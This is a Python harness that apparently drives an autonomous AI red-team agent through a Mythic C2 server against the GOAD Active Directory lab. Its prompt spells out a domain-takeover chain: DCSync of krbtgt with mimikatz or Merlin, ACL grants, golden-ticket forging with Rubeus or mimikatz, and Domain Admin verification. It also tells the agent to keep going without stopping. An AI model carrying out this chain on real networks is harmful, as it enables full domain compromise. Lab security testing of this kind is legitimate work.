#!/usr/bin/env python3
"""Throwaway (gitignored) — GOLDEN TICKET directed-resume run. Sidesteps the global-group/FSP wall:
the controlled foreign principal is a member of the DOMAIN-LOCAL Administrators@ESSOS (which CAN hold a
foreign member), giving DCSync rights. DCSync krbtgt from MEEREEN -> forge golden ticket for a Domain
Admin -> inject -> verify. No cracking (golden ticket uses the krbtgt hash directly). StandIn now added."""
import asyncio
import base64
import json
import sys
import time

sys.path.insert(0, "/home/john/dev/sage/Payload_Type/sage")
from evals.harness import resolve_password, login_to_mythic  # noqa: E402
from evals import phoenix_reader  # noqa: E402
from mythic import mythic  # noqa: E402

DB = "/home/john/dev/sage/Payload_Type/sage/.phoenix/phoenix.db"
DEADLINE_S = 1500

OBJECTIVE = (
    "You are operating an autonomous red-team engagement against the GOAD lab, RESUMING an in-progress "
    "engagement. Do NOT restart from scratch and do NOT repeat completed hops.\n\n"
    "CURRENT POSITION (already achieved):\n"
    "- Active Mythic callbacks on host CASTELBLACK as NORTH\\samwell.tarly: Merlin callback 29 and Apollo "
    "callback 30. Merlin callback 29 holds IN-MEMORY Kerberos service tickets to the essos DC "
    "MEEREEN.ESSOS.LOCAL (cifs/ldap/HOST). You have already crossed into ESSOS.LOCAL. The NORTH and WINTERFELL "
    "hops are DONE — do not repeat them, do not re-collect SharpHound.\n"
    "- Your controlled principal is a member of the BUILTIN ADMINISTRATORS group of essos.local "
    "(ADMINISTRATORS@ESSOS.LOCAL). That group is DOMAIN-LOCAL, which is why your cross-forest (foreign) "
    "principal can be a member of it. Membership in Administrators grants directory-replication (DCSync) "
    "rights on the essos domain.\n\n"
    "DO NOT pursue the dead end from prior runs: adding your foreign principal to DOMAIN ADMINS@ESSOS.LOCAL "
    "is STRUCTURALLY IMPOSSIBLE — Domain Admins is a GLOBAL group and a global group cannot contain a "
    "foreign-forest member. That is why SharpView Add-DomainGroupMember failed on the FSP SID and the ADSI "
    "member write returned a constraint violation. Abandon that approach.\n\n"
    "OBJECTIVE — reach Domain Admin on essos.local via the GOLDEN TICKET route, then VERIFY it:\n"
    "1. As your Administrators@ESSOS principal, DCSYNC the `krbtgt` account from the essos DC "
    "MEEREEN.ESSOS.LOCAL to obtain krbtgt's NTLM/AES key. Use Merlin's native `dcsync` command (or "
    "`mimikatz` `lsadump::dcsync`) targeting domain `essos.local`, user `krbtgt`, dc `meereen.essos.local`, "
    "using your in-memory ESSOS tickets on callback 29. If a direct DCSync is denied, first use your "
    "Administrators control to grant your principal `DS-Replication-Get-Changes` + `DS-Replication-Get-"
    "Changes-All` on the domain object (StandIn `--object`/`--grant` or SharpView Add-DomainObjectAcl), then "
    "DCSync.\n"
    "2. Capture the essos.local DOMAIN SID (from the DCSync output, or StandIn `--domain` / Get-DomainSID).\n"
    "3. FORGE a golden ticket for an essos Domain Admin (impersonate the built-in `Administrator`, with group "
    "RIDs including Domain Admins 512 / Enterprise Admins 519 / Administrators 544) using the krbtgt key + "
    "domain SID — via `mimikatz` `kerberos::golden` or Rubeus `golden`. Inject it into a new logon session "
    "(/ptt or a sacrificial process).\n"
    "4. VERIFY Domain Admin: with the golden ticket, perform a DA-only action against MEEREEN.ESSOS.LOCAL — "
    "e.g. list `\\\\meereen.essos.local\\C$`, enumerate DOMAIN ADMINS membership over LDAP, or DCSync the "
    "`Administrator` account — and confirm it succeeds. State clearly when Domain Admin on essos.local is "
    "achieved.\n\n"
    "TRADECRAFT:\n"
    "- Execute registered C# tooling on Merlin callback 29 via `execute-assembly` with `filename` referencing "
    "the ALREADY-REGISTERED file BY NAME (e.g. filename='Rubeus.exe', filename='StandIn.exe'); do NOT upload "
    "a new file and do NOT use a new-file/UUID upload group. Prefer in-process (load-assembly + "
    "invoke-assembly). StandIn.exe and Rubeus.exe are registered.\n"
    "- NO offline credential cracking. A golden ticket uses the krbtgt hash DIRECTLY (no cracking) and is "
    "explicitly allowed.\n"
    "- Do NOT stop to write a 'Final Report' describing the next step — EXECUTE each step; only stop when you "
    "have verified Domain Admin on essos.local, or you hit a genuinely unrecoverable blocker (then state "
    "exactly which capability is missing). Persist through recoverable tool errors by fixing the argument "
    "form (correct parameter group, SID vs DN) and retrying.\n\n"
    "Begin now: confirm callback 29's ESSOS tickets, DCSync krbtgt from MEEREEN, forge and inject the golden "
    "ticket, then verify Domain Admin on essos.local. Narrate each step."
)


async def dump(client, task_id):
    out = await mythic.get_all_task_output_by_id(mythic=client, task_display_id=task_id)
    chunks = []
    for o in out:
        raw = o.get("response_text") or o.get("response") or ""
        if not raw:
            continue
        try:
            chunks.append(base64.b64decode(raw).decode("utf-8", "replace"))
        except Exception:
            chunks.append(str(raw))
    return "\n".join(chunks)


async def main():
    client = await login_to_mythic(resolve_password())
    pre_rowid = phoenix_reader.max_trace_rowid(DB)
    print(f"pre_rowid={pre_rowid}")
    task = await mythic.issue_task(
        mythic=client,
        command_name="query",
        parameters=json.dumps({
            "prompt": OBJECTIVE, "verbose": True, "autonomous_solve": True, "max_steps": 300,
        }),
        callback_display_id=15,
    )
    tid = task.get("display_id") or task.get("id")
    print(f"issued task: {json.dumps(task, default=str)[:300]}")
    print(f"TASK_ID={tid}")

    start = time.time()
    while True:
        elapsed = int(time.time() - start)
        q = "query t($id: Int!){ task(where:{display_id:{_eq:$id}}){ display_id status completed } }"
        res = await mythic.execute_custom_query(mythic=client, query=q, variables={"id": tid})
        rows = res.get("task", [])
        if rows:
            t = rows[0]
            print(f"[{elapsed}s] status={t.get('status')!r} completed={t.get('completed')}")
            if t.get("completed") or (t.get("status") or "").lower() in ("error", "completed"):
                break
        else:
            print(f"[{elapsed}s] task {tid} not found yet")
        if elapsed > DEADLINE_S:
            print(f"[{elapsed}s] DEADLINE hit")
            break
        await asyncio.sleep(20)

    q2 = ("query t($id:Int!){ task(where:{display_id:{_gt:$id}}, order_by:{display_id:asc}){ "
          "display_id command_name status callback{ display_id payload{ payloadtype{ name } } } } }")
    r2 = await mythic.execute_custom_query(mythic=client, query=q2, variables={"id": tid})
    print(f"\n=== NEW SUBTASKS issued after {tid}: {len(r2.get('task', []))} ===")
    for t in r2.get("task", []):
        cb = t.get("callback") or {}
        pt = ((cb.get("payload") or {}).get("payloadtype") or {}).get("name")
        print(f"  #{t['display_id']} cb{cb.get('display_id')} {pt} {t['command_name']} {t['status']}")

    print("\n=== DECODED OUTPUT (last 12000 chars) ===")
    print((await dump(client, tid))[-12000:])


if __name__ == "__main__":
    asyncio.run(main())
